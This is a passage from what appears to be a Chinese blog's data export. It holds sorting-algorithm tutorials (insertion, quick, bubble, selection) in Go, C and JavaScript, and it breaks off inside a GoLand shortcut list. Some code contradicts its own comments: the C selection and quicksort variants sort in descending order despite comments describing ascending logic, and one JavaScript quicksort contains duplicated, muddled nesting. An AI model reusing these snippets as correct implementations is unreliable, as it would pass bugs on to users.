7, 8] 2 4 ↑ │ └────────────────┘[1, 2, 3, 5, 6, 7, 8] 4 ↑ │ └─────────────┘[1, 2, 3, 4, 5, 6, 7, 8] 动画演示 go语言实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package mainimport \"fmt\"//打印func print(arr []int)&#123; for _,data := range arr&#123; fmt.Printf(\"%d \",data) &#125; fmt.Println()&#125;func main()&#123; arr:= []int&#123;8, 5, 2, 6, 9, 3, 1, 4, 0, 7&#125; //arr:=[]int&#123;1,3,2,4,9,2,6,5,4,8&#125; print(arr) insertsort2(arr) print(arr)&#125;// 插入排序func insertsort(arr []int)&#123; //print(arr) length := len(arr) for i:= 1;i&lt;length;i++&#123; temp := arr[i] index:=i for j:= i-1;j&gt;=0;j--&#123; if arr[j] &gt;temp&#123; arr[j+1] = arr[j] &#125;else&#123; break &#125; index-- &#125; arr[index] = temp &#125;&#125;//推荐func insertsort2(arr []int)&#123; //print(arr) length := len(arr) for i:= 1;i&lt;length;i++&#123; temp := arr[i] j:=i-1 for j&gt;=0 &amp;&amp; arr[j] &gt; temp&#123; arr[j+1] = arr[j] j-- &#125; arr[j+1] = temp &#125;&#125; JavaScript 语言实现 直接插入排序 JavaScript 实现代码： 1234567891011121314151617181920function insertionSort(array) &#123; function swap(array, i, j) &#123; var temp = array[i]; array[i] = array[j]; array[j] = temp; &#125; var length = array.length, i, j; for (i = 1; i &lt; length; i++) &#123; for (j = i; j &gt; 0; j--) &#123; if (array[j - 1] &gt; array[j]) &#123; swap(array, j - 1, j); &#125; else &#123; break; &#125; &#125; &#125; return array;&#125; 下面这种方式可以减少交换次数： 123456789101112131415161718function insertionSort(array) &#123; var length = array.length, i, j, temp; for (i = 1; i &lt; length; i++) &#123; temp = array[i]; for (j = i; j &gt;= 0; j--) &#123; if (array[j - 1] &gt; temp) &#123; array[j] = array[j - 1]; &#125; else &#123; array[j] = temp; break; &#125; &#125; &#125; return array;&#125; 利用二分查找法实现的插入排序，二分查找排序： 123456789101112131415161718192021222324252627282930313233343536373839404142function insertionSort2(array) &#123; function binarySearch(array, start, end, temp) &#123; var middle; while (start &lt;= end) &#123; middle = Math.floor((start + end) / 2); if (array[middle] &lt; temp) &#123; if (temp &lt;= array[middle + 1]) &#123; return middle + 1; &#125; else &#123; start = middle + 1; &#125; &#125; else &#123; if (end === 0) &#123; return 0; &#125; else &#123; end = middle; &#125; &#125; &#125; &#125; function binarySort(array) &#123; var length = array.length, i, j, k, temp; for (i = 1; i &lt; length; i++) &#123; temp = array[i]; if (array[i - 1] &lt;= temp) &#123; k = i; &#125; else &#123; k = binarySearch(array, 0, i - 1, temp); for (j = i; j &gt; k; j--) &#123; array[j] = array[j - 1]; &#125; &#125; array[k] = temp; &#125; return array; &#125; return binarySort(array);&#125; 资料 Wikipedia 维基百科 - 插入排序 维基百科 - 二分查找法 排序算法–折半插入排序（二分查找排序） 直接插入排序 直接插入排序基本思想","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go-数据结构[10]-快速排序","slug":"go-struture-10-quicksort","date":"2019-03-10T04:29:02.000Z","updated":"2019-03-10T05:35:30.288Z","comments":true,"path":"2019/03/10/go-struture-10-quicksort/","link":"","permalink":"https://dreamerjonson.com/2019/03/10/go-struture-10-quicksort/","excerpt":"","text":"pre,code { font-family: \"Source Code Pro\", Consolas, Monaco, Menlo, Consolas, monospace !important; } 快速排序 快速排序是图灵奖得主 C. R. A. Hoare 于 1960 年提出的一种划分交换排序。它采用了一种分治的策略，通常称其为分治法(Divide-and-ConquerMethod)。 分治法的基本思想是：将原问题分解为若干个规模更小但结构与原问题相似的子问题。递归地解这些子问题，然后将这些子问题的解组合为原问题的解。 利用分治法可将快速排序的分为三步： 在数据集之中，选择一个元素作为”基准”（pivot）。 所有小于”基准”的元素，都移到”基准”的左边；所有大于”基准”的元素，都移到”基准”的右边。这个操作称为分区 (partition) 操作，分区操作结束后，基准元素所处的位置就是最终排序后它的位置。 对”基准”左边和右边的两个子集，不断重复第一步和第二步，直到所有子集只剩下一个元素为止。 分区是快速排序的主要内容，用伪代码可以表示如下： 12345678910function partition(a, left, right, pivotIndex) pivotValue := a[pivotIndex] swap(a[pivotIndex], a[right]) // 把 pivot 移到結尾 storeIndex := left for i from left to right-1 if a[i] &lt; pivotValue swap(a[storeIndex], a[i]) storeIndex := storeIndex + 1 swap(a[right], a[storeIndex]) // 把 pivot 移到它最後的地方 return storeIndex // 返回 pivot 的最终位置 首先，把基准元素移到結尾（如果直接选择最后一个元素为基准元素，那就不用移动），然后从左到右（除了最后的基准元素），循环移动小于等于基准元素的元素到数组的开头，每次移动 storeIndex 自增 1，表示下一个小于基准元素将要移动到的位置。循环结束后 storeIndex 所代表的的位置就是基准元素的所有摆放的位置。所以最后将基准元素所在位置（这里是 right）与 storeIndex 所代表的的位置的元素交换位置。要注意的是，一个元素在到达它的最后位置前，可能会被交换很多次。 一旦我们有了这个分区算法，要写快速排列本身就很容易： 123456procedure quicksort(a, left, right) if right &gt; left select a pivot value a[pivotIndex] pivotNewIndex := partition(a, left, right, pivotIndex) quicksort(a, left, pivotNewIndex-1) quicksort(a, pivotNewIndex+1, right) 过程 举例来说，现有数组 arr = [3,7,8,5,2,1,9,5,4]，分区可以分解成以下步骤： 首先选定一个基准元素，这里我们元素 5 为基准元素（基准元素可以任意选择）： 123 pivot ↓3 7 8 5 2 1 9 5 4 将基准元素与数组中最后一个元素交换位置，如果选择最后一个元素为基准元素可以省略该步： 123 pivot ↓3 7 8 4 2 1 9 5 5 从左到右（除了最后的基准元素），循环移动小于基准元素 5 的所有元素到数组开头，留下大于等于基准元素的元素接在后面。在这个过程它也为基准元素找寻最后摆放的位置。循环流程如下： 循环 i == 0 时，storeIndex == 0，找到一个小于基准元素的元素 3，那么将其与 storeIndex 所在位置的元素交换位置，这里是 3 自身，交换后将 storeIndex 自增 1，storeIndex == 1： 12345 pivot ↓ 3 7 8 4 2 1 9 5 5 ↑storeIndex 循环 i == 3 时，storeIndex == 1，找到一个小于基准元素的元素 4： 12345 ┌───────┐ pivot ↓ ↓ ↓ 3 7 8 4 2 1 9 5 5 ↑ ↑storeIndex i 交换位置后，storeIndex 自增 1，storeIndex == 2： 12345 pivot ↓3 4 8 7 2 1 9 5 5 ↑ storeIndex 循环 i == 4 时，storeIndex == 2，找到一个小于基准元素的元素 2： 12345 ┌───────┐ pivot ↓ ↓ ↓3 4 8 7 2 1 9 5 5 ↑ ↑ storeIndex i 交换位置后，storeIndex 自增 1，storeIndex == 3： 12345 pivot ↓3 4 2 7 8 1 9 5 5 ↑ storeIndex 循环 i == 5 时，storeIndex == 3，找到一个小于基准元素的元素 1： 12345 ┌───────┐ pivot ↓ ↓ ↓3 4 2 7 8 1 9 5 5 ↑ ↑ storeIndex i 交换后位置后，storeIndex 自增 1，storeIndex == 4： 12345 pivot ↓3 4 2 1 8 7 9 5 5 ↑ storeIndex 循环 i == 7 时，storeIndex == 4，找到一个小于等于基准元素的元素 5： 12345 ┌───────────┐ pivot ↓ ↓ ↓3 4 2 1 8 7 9 5 5 ↑ ↑ storeIndex i 交换后位置后，storeIndex 自增 1，storeIndex == 5： 12345 pivot ↓3 4 2 1 5 7 9 8 5 ↑ storeIndex 循环结束后交换基准元素和 storeIndex 位置的元素的位置： 12345 pivot ↓3 4 2 1 5 5 9 8 7 ↑ storeIndex 那么 storeIndex 的值就是基准元素的最终位置，这样整个分区过程就完成了。 go语言实现1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package mainimport \"fmt\"//打印func print(arr []int)&#123; for _,data := range arr&#123; fmt.Printf(\"%d \",data) &#125; fmt.Println()&#125;func main()&#123; //arr:= []int&#123;8, 5, 2, 6, 9, 3, 1, 4, 0, 7&#125; arr:=[]int&#123;1,3,2,4,9,2,6,5,4,8&#125; print(arr) quicksort(arr) print(arr)&#125;//快速排序func quicksort(arr []int)&#123; //print(arr) length := len(arr) if length &lt;2&#123; return &#125; index:= 0 start := 0 for i:=1;i&lt;length;i++&#123; if arr[i] &lt;= arr[start]&#123; index++ temp:= arr[index] arr[index] = arr[i] arr[i] = temp &#125; &#125; tmp:= arr[index] arr[index] = arr[start] arr[start] = tmp quicksort(arr[start:index]) quicksort(arr[index+1:length])&#125; 快速排序第二种方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/*Copyright © 2018 jonson*/package mainimport \"fmt\"//打印func show(arr []int)&#123; for i:=0;i&lt;len(arr);i++&#123; fmt.Println(arr[i]) &#125; fmt.Println(\"----------------------------------------------\")&#125;func main()&#123; k := []int&#123;1,3,2,4,9,2,6,5,4,8&#125; show(k) quicksort(k) show(k)&#125;func quicksort(arr []int)&#123; if len(arr) &gt;1&#123;//必须要长度大于1才有意义。 end := len(arr) i := 0 j := len(arr) for i&lt;j&#123; for i &lt; end-1&#123; i++ if arr[i] &lt;= arr[0]&#123; break &#125; &#125; for j&gt;0&#123; j-- if arr[j]&gt;=arr[0]&#123; break &#125; &#125; //如果i&lt;j，说明要将这两个元素交换 if i &lt; j&#123; temp :=arr[i] arr[i] = arr[j] arr[j] = temp &#125; &#125; //交换start和 j 。 到此为止， j之前为小于start元素的，j之后为大于start元素的。 tmp := arr[j] arr[j] = arr[0] arr[0] = tmp //递归下去 if j &gt;0 &#123; quicksort(arr[0:j]) &#125; if j+1 &lt; end&#123; quicksort(arr[j+1:end]) &#125; &#125;&#125; c语言实现1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//打印void show(int *a,int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(\"%d\\n\", a[i]); &#125; printf(\"---------------------------\\n\");&#125;//快速排序,不仅要写出来，而且要优美//arr 为数组//start 为开始的元素的下标//end 为结束的元素的下标+1void quick_sort(int *arr, int start, int end)&#123; if (start &lt; end) //必须要开始的元素 &lt;结束的元素才有意义。 &#123; //赋值 int i = start; int j = end; //i在++，j在--。第一个do为当i&lt;j时就继续下去。 do &#123; do //此do一直让i++，直到，发现大于start的 &#123; i++; &#125; while (i &lt; end &amp;&amp; arr[i] &lt; arr[start]); do//此do一直让j--，直到，发现小于start的元素 &#123; j--; &#125; while (j&gt;start &amp;&amp; arr[j]&gt;arr[start]); //如果i&lt;j，说明要将这两个元素交换 if (i &lt; j) &#123; int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; while (i&lt;j); //交换start和 j 。 到此为止， j之前为小于start元素的，j之后为大于start元素的。 int temp = arr[j]; arr[j] = arr[start]; arr[start] = temp; //递归下去 quick_sort(arr, start, j); quick_sort(arr, j + 1, end); &#125;&#125;void main()&#123; int a[10] = &#123; 1,3,2,4,9,2,6,5,4,8 &#125;; show(a, 10); quick_sort(a, 0,10); show(a, 10); system(\"pause\");&#125; c语言实现2 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//打印void show(int *a,int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(\"%d\\n\", a[i]); &#125; printf(\"---------------------------\\n\");&#125;//快速排序,不仅要写出来，而且要优美//arr 为数组//start 为开始的元素的下标//end 为结束的元素的下标+1void quick_sort2(int *arr, int start, int end)&#123; if (start &lt; end) &#123; //start &lt; end 才有进新下去的意义。 //i从第一个开始，记录下标。 int i = start; //从第二个元素开始，循环到末尾 for (int j = start+1; j &lt; end; j++) &#123; //一旦发现比其start小的 if (arr[j] &gt; arr[start]) &#123; //i++,很重要的一步，也就是让发现的小于start的数，依次放置在第2个，第3个....位置上。 i++; //交换 int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; ////交换start和i 。 到此为止， i之前为小于start元素的，i之后为大于start元素的。 int temp = arr[i]; arr[i] = arr[start]; arr[start] = temp; //递归 quick_sort2(arr, start, i); quick_sort2(arr, i+1, end); &#125;&#125;void main()&#123; int a[10] = &#123; 1,3,2,4,9,2,6,5,4,8 &#125;; show(a, 10); quick_sort2(a, 0,10); show(a, 10); system(\"pause\");&#125; JavaScript 语言实现 1234567891011121314151617function quickSort(arr) &#123; if (arr.length &lt;= 1) &#123; return arr; &#125; var pivotIndex = Math.floor(arr.length / 2); var pivot = arr.splice(pivotIndex, 1)[0]; var left = []; var right = []; for (var i = 0; i &lt; arr.length; i++) &#123; if (arr[i] &lt; pivot) &#123; left.push(arr[i]); &#125; else &#123; right.push(arr[i]); &#125; &#125; return quickSort(left).concat([pivot], quickSort(right));&#125; JavaScript 语言实现2 123456789101112131415161718192021222324252627282930313233//上面简单版本的缺点是，它需要Ω(n)的额外存储空间，也就跟归并排序一样不好。额外需要的存储器空间配置，在实际上的实现，也会极度影响速度和高速缓存的性能。function quickSort(array) &#123; // 交换元素位置 function swap(array, i, k) &#123; var temp = array[i]; array[i] = array[k]; array[k] = temp; &#125; // 数组分区，左小右大 function partition(array, left, right) &#123; var storeIndex = left; var pivot = array[right]; // 直接选最右边的元素为基准元素 for (var i = left; i &lt; right; i++) &#123; if (array[i] &lt; pivot) &#123; swap(array, storeIndex, i); storeIndex++; // 交换位置后，storeIndex 自增 1，代表下一个可能要交换的位置 &#125; &#125; swap(array, right, storeIndex); // 将基准元素放置到最后的正确位置上 return storeIndex; &#125; function sort(array, left, right) &#123; if (left &gt; right) &#123; return; &#125; var storeIndex = partition(array, left, right); sort(array, left, storeIndex - 1); sort(array, storeIndex + 1, right); &#125; sort(array, 0, array.length - 1); return array;&#125; JavaScript 语言实现3 1234567891011121314151617181920212223242526272829303132333435363738function quickSort(arr) &#123; return sort(arr, 0, arr.length - 1); function swap(arr, i, k) &#123; var temp = arr[i]; arr[i] = arr[k]; arr[k] = temp; &#125; function sort(arr, start, end) &#123; sort(arr, 0, arr.length - 1); return arr; function swap(arr, i, k) &#123; var temp = arr[i]; arr[i] = arr[k]; arr[k] = temp; &#125; function sort(arr, start, end) &#123; if (start &gt;= end) return; var pivot = arr[start], i = start + 1, k = end; while (true) &#123; while (arr[i] &lt; pivot) &#123; i++; &#125; while (arr[k] &gt; pivot) &#123; k--; &#125; if (i &gt;= k) &#123; break; &#125; swap(arr, i, k); &#125; swap(arr, start, k); sort(arr, start, Math.max(0, k - 1)); sort(arr, Math.min(end, k + 1), end); &#125; &#125;&#125; 资料 wiki Quicksort 维基百科 - 快速排序 快速排序（Quicksort）的Javascript实现 Quicksort in JavaScript 经典排序算法 - 快速排序Quick sort 快速排序(QuickSort) ソートアルゴリズムを映像化してみた Stable quicksort in Javascript Friday Algorithms: Quicksort – Difference Between PHP and JavaScript","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go-数据结构[9]-冒泡排序","slug":"go-struture-8-select","date":"2019-03-09T12:26:33.000Z","updated":"2019-03-10T04:30:01.608Z","comments":true,"path":"2019/03/09/go-struture-8-select/","link":"","permalink":"https://dreamerjonson.com/2019/03/09/go-struture-8-select/","excerpt":"","text":"冒泡排序 冒泡排序（Bubble Sort，台湾译为：泡沫排序或气泡排序）是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。复杂度o(n2) Bubble sort, sometimes referred to as sinking sort, is a simple sorting algorithm that repeatedly steps through the list, compares adjacent pairs and swaps them if they are in the wrong order. The pass through the list is repeated until the list is sorted. The algorithm, which is a comparison sort, is named for the way smaller or larger elements “bubble” to the top of the list. Although the algorithm is simple, it is too slow and impractical for most problems even when compared to insertion sort.[2] Bubble sort can be practical if the input is in mostly sorted order with some out-of-order elements nearly in position. 冒泡排序算法的流程如下： 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 由于它的简洁，冒泡排序通常被用来对于程序设计入门的学生介绍算法的概念。 Google CEO Eric Schmidt asked president Barack Obama once during an interview about the best way to sort one million integers – and Obama, pausing for a moment, then replied: “I think the bubble sort would be the wrong way to go.” 实现过程 以数组 arr = [5, 1, 4, 2, 8] 为例说明，加粗的数字表示每次循环要比较的两个数字： 第一次外循环 ( 5 1 4 2 8 ) → ( 1 5 4 2 8 )， 5 &gt; 1 交换位置( 1 5 4 2 8 ) → ( 1 4 5 2 8 )， 5 &gt; 4 交换位置( 1 4 5 2 8 ) → ( 1 4 2 5 8 )， 5 &gt; 2 交换位置( 1 4 2 5 8 ) → ( 1 4 2 5 8 )， 5 &lt; 8 位置不变 第二次外循环（除开最后一个元素8，对剩余的序列） ( 1 4 2 5 8 ) → ( 1 4 2 5 8 )， 1 &lt; 4 位置不变( 1 4 2 5 8 ) → ( 1 2 4 5 8 )， 4 &gt; 2 交换位置( 1 2 4 5 8 ) → ( 1 2 4 5 8 )， 4 &lt; 5 位置不变 第三次外循环（除开已经排序好的最后两个元素，可以注意到上面的数组其实已经排序完成，但是程序本身并不知道，所以还要进行后续的循环，直到剩余的序列为 1） ( 1 2 4 5 8 ) → ( 1 2 4 5 8 )( 1 2 4 5 8 ) → ( 1 2 4 5 8 ) 第四次外循环（最后一次）( 1 2 4 5 8 ) → ( 1 2 4 5 8 ) Go语言实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package mainimport \"fmt\"//打印func print(arr []int)&#123; for _,data := range arr&#123; fmt.Printf(\"%d \",data) &#125; fmt.Println()&#125;func main()&#123; arr:= []int&#123;8, 5, 2, 6, 9, 3, 1, 4, 0, 7&#125; print(arr) maopao2(arr) print(arr)&#125;//冒泡排序func maopao(arr []int)&#123; length:= len(arr) //循环的次数，只用循环 length-1次，即最后只用判断两个数就可以了。 for i:=0;i&lt;length-1;i++&#123; //将数冒到最后，冒完后就不管了，因此每一次需要判断的是length - 1 - i长度。 for j:=0;j&lt;length-1-i;j++&#123; //如果前面的数大于后面的数，交换顺序。 if arr[j] &gt; arr[j+1]&#123; temp:= arr[j] arr[j] = arr[j+1] arr[j+1] = temp &#125; &#125; &#125;&#125;//明白了冒泡的原理，就很容易写出一了倒叙的冒泡func maopao2(arr []int)&#123; length:= len(arr) //和正序一样，倒叙的第一个循环的次数必须是length -1 for i:=length-1;i&gt;0;i--&#123; //第二个循环从最后一个元素开始，一直到只剩下最后一个元素。 //也就是说，最后一次判断为最后两个数之间的判断。 for j:= length -1; j&gt;length -1 - i ;j--&#123; //判断 if arr[j] &gt; arr[j-1]&#123; temp:= arr[j] arr[j] = arr[j-1] arr[j-1] = temp &#125; &#125; &#125;&#125; c语言实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void maopao(int *a,int length);//正序冒泡void maopao2(int *arr, int length);//倒序冒泡void main()&#123; int a[10] = &#123; 1,3,2,4,9,2,6,5,4,8 &#125;; show(a, 10); maopao2(a, 10); show(a, 10); system(\"pause\");&#125;//打印void show(int *a,int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(\"%d\\n\", a[i]); &#125; printf(\"---------------------------\\n\");&#125;//冒泡排序，a为数组，length为其长度void maopao(int *a,int length)&#123; //循环的次数，只用循环 length-1次，即最后只用判断两个数就可以了。 for (int i = 0; i &lt; length-1; i++) &#123; //将数冒到最后，冒完后就不管了，因此每一次需要判断的是length - 1 - i长度。 for (int j = 0; j &lt; length - 1 - i;j++) &#123; //如果前面的数大于后面的数，交换顺序。 if (a[j] &gt; a[j + 1]) &#123; int temp = a[j]; a[j] = a[j + 1]; a[j + 1] = temp; &#125; &#125; &#125;&#125;//明白了冒泡的原理，就很容易写出一了倒叙的冒泡void maopao2(int *arr, int length)&#123; //和正序一样，倒叙的第一个循环的次数必须是length -1 for (int i = length; i &gt; 0; i--) &#123; //第二个循环从最后一个元素开始，一直到只剩下最后一个元素。 //也就是说，最后一次判断为最后两个数之间的判断。 for (int j = length - 1; j &gt; length-i; j--) &#123; //判断 if (arr[j - 1] &gt; arr[j]) &#123; int temp = arr[j]; arr[j] = arr[j - 1]; arr[j - 1] = temp; &#125; &#125; &#125;&#125; js实现 12345678910111213141516function bubbleSort(array) &#123; var length = array.length, i, j, temp; for (i = length - 1; 0 &lt; i; i--) &#123; for (j = 0; j &lt; i; j++) &#123; if (array[j] &gt; array[j + 1]) &#123; temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; return array;&#125; 资料 en.wikipedia.org 维基百科，自由的百科全书 Bubble Sort 经典排序算法 - 冒泡排序Bubble sort 冒泡排序","categories":[{"name":"go 数据结构","slug":"go-数据结构","permalink":"https://dreamerjonson.com/categories/go-数据结构/"}],"tags":[{"name":"go 数据结构","slug":"go-数据结构","permalink":"https://dreamerjonson.com/tags/go-数据结构/"}]},{"title":"go-数据结构[8]-选择排序","slug":"go-structure-6-Selection-Sort","date":"2019-03-09T10:32:04.000Z","updated":"2019-03-10T09:05:15.558Z","comments":true,"path":"2019/03/09/go-structure-6-Selection-Sort/","link":"","permalink":"https://dreamerjonson.com/2019/03/09/go-structure-6-Selection-Sort/","excerpt":"","text":"pre,code { font-family: \"Source Code Pro\", Consolas, Monaco, Menlo, Consolas, monospace !important; } 选择排序 选择排序（Selection Sort）是一种简单直观的排序算法。它的工作原理如下，首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 选择排序的主要优点与数据移动有关。如果某个元素位于正确的最终位置上，则它不会被移动。选择排序每次交换一对元素，它们当中至少有一个将被移到其最终位置上，因此对n个元素的序列进行排序总共进行至多n-1次交换。在所有的完全依靠交换去移动元素的排序方法中，选择排序属于非常好的一种。 In computer science, selection sort is a sorting algorithm, specifically an in-place comparison sort. It has O(n2) time complexity, making it inefficient on large lists, and generally performs worse than the similar insertion sort. Selection sort is noted for its simplicity, and it has performance advantages over more complicated algorithms in certain situations, particularly where auxiliary memory is limited. The algorithm divides the input list into two parts: the sublist of items already sorted, which is built up from left to right at the front (left) of the list, and the sublist of items remaining to be sorted that occupy the rest of the list. Initially, the sorted sublist is empty and the unsorted sublist is the entire input list. The algorithm proceeds by finding the smallest (or largest, depending on sorting order) element in the unsorted sublist, exchanging (swapping) it with the leftmost unsorted element (putting it in sorted order), and moving the sublist boundaries one element to the right. 实例分析 以数组 arr = [8, 5, 2, 6, 9, 3, 1, 4, 0, 7] 为例，先直观看一下每一步的变化，后面再介绍细节 第一次从数组 [8, 5, 2, 6, 9, 3, 1, 4, 0, 7] 中找到最小的数 0，放到数组的最前面（与第一个元素进行交换）： 12345 min ↓8 5 2 6 9 3 1 4 0 7 ↑└───────────────────────────────┘ 交换后： 10 5 2 6 9 3 1 4 8 7 在剩余的序列中 [5, 2, 6, 9, 3, 1, 4, 8, 7] 中找到最小的数 1，与该序列的第一个个元素进行位置交换： 12345 min ↓0 5 2 6 9 3 1 4 8 7 ↑ ↑ └───────────────────┘ 交换后： 10 1 2 6 9 3 5 4 8 7 在剩余的序列中 [2, 6, 9, 3, 5, 4, 8, 7] 中找到最小的数 2，与该序列的第一个个元素进行位置交换（实际上不需要交换）： 12345 min ↓0 1 2 6 9 3 5 4 8 7 ↑ 重复上述过程，直到最后一个元素就完成了排序。 1234567891011121314151617181920212223242526272829303132 min ↓0 1 2 6 9 3 5 4 8 7 ↑ ↑ └───────┘ min ↓0 1 2 3 9 6 5 4 8 7 ↑ ↑ └───────────┘ min ↓0 1 2 3 4 6 5 9 8 7 ↑ ↑ └───┘ min ↓0 1 2 3 4 5 6 9 8 7 ↑ min ↓0 1 2 3 4 5 6 9 8 7 ↑ ↑ └───────┘ min ↓0 1 2 3 4 5 6 7 8 9 ↑ min ↓0 1 2 3 4 5 6 7 8 9 ↑ go语言实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport \"fmt\"//打印func print(arr []int)&#123; for _,data := range arr&#123; fmt.Printf(\"%d \",data) &#125; fmt.Println() &#125;func main()&#123; arr:= []int&#123;8, 5, 2, 6, 9, 3, 1, 4, 0, 7&#125; print(arr) selectSort(arr) print(arr)&#125; //选择排序func selectSort(arr []int)&#123; length := len(arr) //第一个循环从第一个元素到倒数第二个元素。 for i:= 0;i&lt;length-1;i++&#123; //最小的序号 index:= i //遍历其后面的节点，找到最小的节点的下标。 for j:= i+1;j&lt;length;j++&#123; if arr[index]&gt; arr[j]&#123; //保留下标 index = j &#125; &#125; //index != i，就将最小的数交换到a[i]的位置。 if index != i&#123; temp := arr[i] arr[i] = arr[index] arr[index] = temp &#125; &#125;&#125; c语言实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt; void select_sort(int *a,int length) ;void show(int *a,int length);void main()&#123; int a[10] = &#123; 1,3,2,4,9,2,6,5,4,8 &#125;; show(a, 10); select_sort(a, 10); show(a, 10); system(\"pause\");&#125;//打印void show(int *a,int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(\"%d\\n\", a[i]); &#125; printf(\"---------------------------\\n\");&#125;//选择排序//选择排序排序，a为数组，length为其长度void select_sort(int *a,int length)&#123; //最小的序号 int min = 0; //第一个循环从第一个元素到倒数第二个元素。 for (int i = 0; i &lt; length - 1; i++) &#123; //保留下标 min = i; //遍历其后面的节点，找到最小的节点的下标。 for (int j = i + 1; j &lt; length; j++) &#123; if (a[j] &gt; a[min]) &#123; min = j; &#125; &#125; //如果min != i，就将最小的数交换到a[i]的位置。 if (min != i) &#123; int temp = a[min]; a[min] = a[i]; a[i] = temp; &#125; &#125;&#125; js实现 1234567891011121314151617181920212223function selectionSort(array) &#123; var length = array.length, i, j, minIndex, minValue, temp; for (i = 0; i &lt; length - 1; i++) &#123; minIndex = i; minValue = array[minIndex]; for (j = i + 1; j &lt; length; j++) &#123; if (array[j] &lt; minValue) &#123; minIndex = j; minValue = array[minIndex]; &#125; &#125; // 交换位置 temp = array[i]; array[i] = minValue; array[minIndex] = temp; &#125; return array&#125; 参考文献 en.wikipedia.org wikibooks 维基百科 Selection sort in JavaScript 直接选择排序(Straight Selection Sort) 经典排序算法 - 选择排序 Selection Sort 选择排序算法","categories":[{"name":"go 数据结构","slug":"go-数据结构","permalink":"https://dreamerjonson.com/categories/go-数据结构/"}],"tags":[{"name":"go 数据结构","slug":"go-数据结构","permalink":"https://dreamerjonson.com/tags/go-数据结构/"}]},{"title":"golang[70]-web编程-未完待续....","slug":"golang-70-web","date":"2019-03-05T02:33:12.000Z","updated":"2019-03-09T10:59:04.473Z","comments":true,"path":"2019/03/05/golang-70-web/","link":"","permalink":"https://dreamerjonson.com/2019/03/05/golang-70-web/","excerpt":"","text":"","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[69]-goland快捷键","slug":"golang-69-shortkey","date":"2019-03-05T02:25:56.000Z","updated":"2019-03-05T02:34:27.513Z","comments":true,"path":"2019/03/05/golang-69-shortkey/","link":"","permalink":"https://dreamerjonson.com/2019/03/05/golang-69-shortkey/","excerpt":"","text":"Mac 键盘符号和修饰键说明 123456789101112131415161718⌘ ——&gt; Command⇧ ——&gt; Shift⌥ ——&gt; Option⌃ ——&gt; Control↩︎ ——&gt; Return/Enter⌫ ——&gt; Delete⌦ ——&gt; 向前删除键(Fn + Delete)↑ ——&gt; 上箭头↓ ——&gt; 下箭头← ——&gt; 左箭头→ ——&gt; 右箭头⇞ ——&gt; Page Up(Fn + ↑)⇟ ——&gt; Page Down(Fn + ↓)⇥ ——&gt; 右制表符(Tab键)⇤ ——&gt; 左制表符(Shift + Tab)⎋ ——&gt; Escape(Esc)End ——&gt; Fn + →Home ——&gt; Fn + ← Part 1：Editing（编辑） 12345678910111213141516171819202122232425262728293031323334353637383940快捷键 作用Control + Space 基本的代码补全（补全任何类、方法、变量）Control + Shift + Space 智能代码补全（过滤器方法列表和变量的预期类型）Command + Shift + Enter 自动结束代码，行末自动添加分号Command + P 显示方法的参数信息Control + J 快速查看文档Shift + F1 查看外部文档（在某些代码上会触发打开浏览器显示相关文档）Command + 鼠标放在代码上 显示代码简要信息Command + F1 在错误或警告处显示具体描述信息Command + N, Control + Enter, Control + N 生成代码（getter、setter、hashCode、equals、toString、构造函数等）Control + O 覆盖方法（重写父类方法）Control + I 实现方法（实现接口中的方法）Command + Option + T 包围代码（使用if...else、try...catch、for、synchronized等包围选中的代码）Command + / 注释 / 取消注释与行注释Command + Option + / 注释 / 取消注释与块注释Option + 方向键上 连续选中代码块Option + 方向键下 减少当前选中的代码块Control + Shift + Q 显示上下文信息Option + Enter 显示意向动作和快速修复代码Command + Option + L 格式化代码Control + Option + O 优化 importControl + Option + I 自动缩进线Tab / Shift + Tab 缩进代码 / 反缩进代码Command + X 剪切当前行或选定的块到剪贴板Command + C 复制当前行或选定的块到剪贴板Command + V 从剪贴板粘贴Command + Shift + V 从最近的缓冲区粘贴Command + D 复制当前行或选定的块Command + Delete 删除当前行或选定的块的行Control + Shift + J 智能的将代码拼接成一行Command + Enter 智能的拆分拼接的行Shift + Enter 开始新的一行Command + Shift + U 大小写切换Command + Shift + ] / Command + 